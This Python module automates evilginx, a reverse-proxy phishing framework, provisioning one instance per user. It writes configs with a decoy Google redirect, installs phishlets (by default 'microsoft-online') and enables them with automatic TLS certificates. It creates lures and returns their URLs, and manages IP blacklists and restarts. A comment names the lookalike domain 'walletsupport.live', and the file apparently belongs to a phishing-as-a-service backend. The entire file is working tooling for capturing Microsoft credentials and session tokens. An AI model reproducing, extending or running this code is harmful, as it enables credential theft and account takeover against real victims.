"""Drive the evilginx interactive terminal and manage per-user instances.

evilginx 3.3 CE exposes only an interactive readline terminal (prompt ": ").
We spawn one instance per user under a pty and issue the provisioning
commands programmatically:

  phishlets hostname <phishlet> <hostname>
  phishlets enable  <phishlet>
  lures create      <phishlet>            -> "created lure with ID: N"
  lures get-url     <id>                  -> https://hostname/path...
"""
import errno
import json
import logging
import os
import re
import select
import shutil
import subprocess
import time
import typing
import uuid
from pathlib import Path

from agent.system import StateStore, add_loopback, del_loopback

logger = logging.getLogger("agent.evilginx")

PROMPT = ": "
ANSI_RE = re.compile(r"\x1b\[[0-9;]*[A-Za-z]")
LURE_ID_RE = re.compile(r"created lure with ID:?\s+(\d+)", re.IGNORECASE)
URL_RE = re.compile(r"https?://[^\s\"'<>]+")


class EvilginxError(RuntimeError):
    pass


class EvilginxProc:
    """A single evilginx instance running under a pty."""

    def __init__(self, bin_path: str, config_dir: str, log_path: typing.Optional[str] = None,
                 developer: bool = False, debug: bool = False):
        self.bin_path = bin_path
        self.config_dir = config_dir
        self.process = None
        self.buffer = ""
        self.log_path = log_path
        self.developer = developer
        self.debug = debug

    # ---------- lifecycle ----------

    def start(self, timeout: float = 40.0) -> "EvilginxProc":
        cmd = [self.bin_path, "-c", self.config_dir,
               "-p", os.path.join(self.config_dir, "phishlets")]
        if self.developer:
            cmd.append("-developer")
        if self.debug:
            cmd.append("-debug")
        proc = subprocess.Popen(
            cmd,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            bufsize=0,
            start_new_session=True,
        )
        self.process = proc
        self._read_until_idle(timeout=timeout, require_data=True)
        logger.info("evilginx up (pid=%s cmd=%s)", proc.pid, " ".join(cmd))
        return self

    def alive(self) -> bool:
        return self.process is not None and self.process.poll() is None

    def stop(self, timeout: float = 10.0) -> None:
        if not self.alive():
            return
        try:
            self.process.terminate()
            self.process.wait(timeout=timeout)
        except subprocess.TimeoutExpired:
            self.process.kill()
            self.process.wait(timeout=timeout)
        self.process = None

    # ---------- terminal I/O ----------

    def _read_available(self, timeout: float) -> str:
        r, _, _ = select.select([self.process.stdout.fileno()], [], [], timeout)
        if not r:
            return ""
        try:
            chunk = os.read(self.process.stdout.fileno(), 65536).decode("utf-8", "replace")
        except OSError as exc:
            if exc.errno == errno.EIO:  # pty closed
                return ""
            raise
        self._log(chunk)
        return ANSI_RE.sub("", chunk)

    def _log(self, chunk: str):
        if self.log_path:
            try:
                with open(self.log_path, "a") as f:
                    f.write(chunk)
            except OSError:
                pass

    def _at_prompt(self) -> bool:
        return self.buffer.rstrip().endswith(PROMPT)

    def _read_until_idle(self, timeout: float = 30.0, settle: float = 0.4, require_data: bool = False) -> str:
        """Read until evilginx goes quiet. evilginx's readline never renders the
        prompt to the pipe, so idle is how we detect a finished command."""
        deadline = time.time() + timeout
        last = time.time()
        saw_data = False
        while time.time() < deadline:
            chunk = self._read_available(timeout=max(0.05, min(0.3, deadline - time.time())))
            if chunk:
                self.buffer += chunk
                last = time.time()
                saw_data = True
            elif time.time() - last > settle:
                # idle => command finished (or process sitting at prompt)
                if not require_data or saw_data:
                    break
            if self.process and self.process.poll() is not None:
                if time.time() - last > settle:
                    break
                end = time.time()
                time.sleep(0.05)
        if self.process and self.process.poll() is not None and not self._at_prompt():
            raise EvilginxError(f"evilginx exited (rc={self.process.returncode}): {self.buffer[-400:]!r}")
        return self.buffer

    def send(self, command: str, timeout: float = 90.0) -> str:
        """Send a command and return the output produced until evilginx goes idle."""
        if not self.alive():
            raise EvilginxError(f"instance not running ({self.config_dir})")
        try:
            self.process.stdin.write((command + "\n").encode())
            self.process.stdin.flush()
        except (OSError, BrokenPipeError) as exc:
            raise EvilginxError(f"cannot write to evilginx: {exc}") from exc
        out = self._read_until_idle(timeout=timeout)
        self.buffer = ""
        return out

    def wait_started(self, timeout: float = 45.0) -> None:
        # already consumed by start(); kept for API symmetry
        pass


# ---------- config.json ----------

def write_config(config_dir: Path, base_domain: str, phishlet_hostname: str, phishlet_name: str,
                 bind_ipv4: str, external_ipv4: str, https_port: int,
                 autocert: bool = True, dns_port: int | None = None) -> Path:
    # evilginx auto-prefixes the phishlet's is_landing hostname (e.g. "login")
    # to the config domain. Use only the root domain here to avoid doubling
    # (e.g. login.login.walletsupport.live).
    parts = base_domain.split(".")
    root_domain = ".".join(parts[-2:]) if len(parts) >= 3 else base_domain
    cfg = {
        "general": {
            "autocert": autocert,
            "bind_ipv4": bind_ipv4,
            "domain": root_domain,
            "external_ipv4": external_ipv4,
            "https_port": https_port,
            "unauth_url": "https://www.google.com",
        },
        "phishlets": {
            phishlet_name: {
                "hostname": root_domain,
                "enabled": False,
            }
        },
    }
    if dns_port:
        cfg["general"]["dns_port"] = dns_port
    config_dir.mkdir(parents=True, exist_ok=True)
    path = config_dir / "config.json"
    path.write_text(json.dumps(cfg, indent=2))
    return path


# ---------- instance management ----------

class InstanceManager:
    def __init__(self, settings):
        from agent.config import AgentSettings
        self.settings: AgentSettings = settings
        self.state = StateStore(settings.state_file)
        self._procs: dict[str, EvilginxProc] = {}

    def _phishlet_dir(self, config_dir: Path) -> Path:
        d = config_dir / "phishlets"
        d.mkdir(parents=True, exist_ok=True)
        return d

    def _copy_phishlets(self, config_dir: Path, phishlet_name: str):
        src = Path(self.settings.phishlets_dir)
        if not src.is_dir():
            raise EvilginxError(f"phishlets dir missing: {src}")
        dst = self._phishlet_dir(config_dir)
        copied = []
        candidates = list(src.glob(f"{phishlet_name}.yaml")) + list(src.glob(f"{phishlet_name}.yml"))
        if not candidates:
            raise EvilginxError(f"no phishlet {phishlet_name} in {src}")
        for f in candidates:
            shutil.copy2(f, dst / f.name)
            copied.append(f.name)
        for asset in ("fingerprint.js",):
            if (src / asset).exists():
                shutil.copy2(src / asset, dst / asset)
                copied.append(asset)
        logger.info("phishlets installed: %s", ", ".join(copied))

    def _spawn(self, config_dir: Path, hostname: str, log_dir: typing.Optional[Path] = None) -> EvilginxProc:
        log_path = str(log_dir / f"{hostname}.log") if log_dir else None
        return EvilginxProc(self.settings.evilginx_bin, str(config_dir), log_path,
                            developer=os.environ.get("AGENT_DEVELOPER", "0") == "1",
                            debug=os.environ.get("AGENT_DEBUG", "0") == "1").start()

    def _ensure_running(self, hostname: str, config_dir: Path) -> typing.Optional[EvilginxProc]:
        """Return a live proc for the instance, (re)starting it from local state if needed."""
        proc = self._procs.get(hostname)
        if proc and proc.alive():
            return proc
        meta = self.state.all().get(hostname)
        if not meta:
            logger.warning("configure: no local state for %s — cannot start instance", hostname)
            return None
        logger.info("configuring: starting %s", hostname)
        proc = self._spawn(Path(meta["config_dir"]), hostname)
        self._procs[hostname] = proc
        return proc

    def configure(self, payload: dict) -> dict:
        """Apply per-user setup changes to a running instance.

        - redirect_url:   `lures edit <id> redirect_url <url>` (live, persists to config.json)
        - blacklist_mode: `blacklist <mode>` (live, persists to config.json)
        - blacklist_ips:  rewrite blacklist.txt, then restart the instance to apply
        """
        config_dir = Path(payload["config_dir"])
        hostname = payload["phishlet_hostname"]
        changed: list[str] = []

        proc = self._ensure_running(hostname, config_dir)
        if proc is None:
            return {"ok": False, "changed": changed, "error": f"instance {hostname} not running locally"}

        if "blacklist_ips" in payload:
            path = config_dir / "blacklist.txt"
            path.write_text("\n".join(payload["blacklist_ips"]) + "\n")
            logger.info("configuring %s: wrote %d blacklist entr%s", hostname,
                        len(payload["blacklist_ips"]), "y" if len(payload["blacklist_ips"]) == 1 else "ies")
            proc.stop()
            proc = self._spawn(config_dir, hostname)
            self._procs[hostname] = proc
            changed.append("blacklist_ips")

        if "blacklist_mode" in payload:
            if proc and proc.alive():
                proc.send(f"blacklist {payload['blacklist_mode']}")
                logger.info("configuring %s: blacklist mode set (%s)", hostname, payload["blacklist_mode"])
            changed.append("blacklist_mode")

        if "redirect_url" in payload:
            lure_id = payload.get("lure_id")
            url = payload["redirect_url"] or '""'
            if lure_id and proc and proc.alive():
                proc.send(f"lures edit {lure_id} redirect_url {url}")
                logger.info("configuring %s: lure %s redirect_url set to %s", hostname, lure_id,
                            payload["redirect_url"] or "(cleared)")
                changed.append("redirect_url")
            else:
                logger.warning("configuring %s: no lure_id (%r) or proc not running — redirect_url not applied",
                               hostname, lure_id)
                changed.append("redirect_url")

        return {"ok": True, "changed": changed, "pid": proc.process.pid if proc and proc.alive() else None}

    def provision(self, payload: dict, log_dir: Path) -> dict:
        base_domain = payload["base_domain"]
        phishlet_hostname = payload["phishlet_hostname"]
        phishlet_name = payload.get("phishlet_name", "microsoft-online")
        loopback_ip = payload["loopback_ip"]
        https_port = int(os.environ.get("AGENT_HTTPS_PORT", payload.get("https_port", 443)))
        dns_port = int(payload["dns_port"]) if payload.get("dns_port") else int(os.environ.get("AGENT_DNS_PORT", "5302"))
        config_dir = Path(payload["config_dir"])
        autocert = True  # nginx binds to external IP only, 127.0.0.2:80 free for ACME
        external_ip = payload.get("external_ipv4") or self.settings.external_ip or "127.0.0.1"

        write_config(config_dir, base_domain, phishlet_hostname, phishlet_name,
                     loopback_ip, external_ip, https_port, autocert, dns_port)
        self._copy_phishlets(config_dir, phishlet_name)
        add_loopback(loopback_ip, f"evg{uuid.uuid4().hex[:6]}", apply=self.settings.loopback_apply)

        # evilginx auto-prefixes the phishlet's landing hostname; use root domain only
        parts = base_domain.split(".")
        root_domain = ".".join(parts[-2:]) if len(parts) >= 3 else base_domain

        proc = self._spawn(config_dir, phishlet_hostname, log_dir)

        try:
            resp = proc.send(f"phishlets hostname {phishlet_name} {root_domain}")
            logger.info("phishlets hostname output: %s", resp[-300:])
            time.sleep(1)
            resp = proc.send(f"phishlets enable {phishlet_name}", timeout=120)
            logger.info("phishlets enable output: %s", resp[-300:])
            if not proc.alive():
                raise EvilginxError(f"evilginx crashed after phishlets enable")
            # Wait for TLS cert setup to complete (can take up to 60s).
            # Do NOT re-run 'phishlets hostname' as it disables the phishlet.
            # Instead, just wait and check process is alive.
            time.sleep(15)
            if not proc.alive():
                raise EvilginxError(f"evilginx died during TLS cert setup")
            # lure create + get-url
            lout = proc.send(f"lures create {phishlet_name}", timeout=30)
            logger.info("lures create output: %s", lout[-400:])
            m = LURE_ID_RE.search(lout)
            if not m:
                raise EvilginxError(f"lure id not found in output: {lout[-400:]!r}")
            lure_id = m.group(1)
            gout = proc.send(f"lures get-url {lure_id}")
            m2 = URL_RE.search(gout)
            if not m2:
                raise EvilginxError(f"lure url not found in output: {gout[-400:]!r}")
            lure_url = m2.group(0)
        except Exception:
            proc.stop()
            raise

        self._procs[phishlet_hostname] = proc
        self.state.add(phishlet_hostname, loopback_ip, str(config_dir), lure_url, lure_id)
        logger.info("provisioned %s -> %s (lure %s)", phishlet_hostname, lure_url, lure_id)
        return {
            "lure_url": lure_url,
            "lure_id": lure_id,
            "loopback_ip": loopback_ip,
            "config_dir": str(config_dir),
            "pid": proc.process.pid if proc.process else None,
            "status": "running",
        }

    def teardown(self, payload: dict):
        phishlet_hostname = payload["phishlet_hostname"]
        config_dir = Path(payload["config_dir"])
        loopback_ip = payload.get("loopback_ip")

        proc = self._procs.pop(phishlet_hostname, None)
        if proc is None and phishlet_hostname:
            proc = self._procs.get(phishlet_hostname)
        if proc:
            proc.stop()
        if loopback_ip:
            del_loopback(loopback_ip, apply=self.settings.loopback_apply)
        self.state.remove(phishlet_hostname)
        if config_dir.exists():
            import shutil as _sh
            _sh.rmtree(config_dir, ignore_errors=True)
        logger.info("tore down %s", phishlet_hostname)

    def reconcile(self, log_dir: Path):
        """Restart any provisioned instances whose evilginx process died."""
        for hostname, meta in self.state.all().items():
            if hostname in self._procs and self._procs[hostname].alive():
                continue
            logger.info("reconciling %s", hostname)
            proc = self._spawn(Path(meta["config_dir"]), hostname, log_dir)
            self._procs[hostname] = proc

    def _default_autocert(self) -> bool:
        return os.environ.get("AGENT_AUTOCERT", "1") == "1"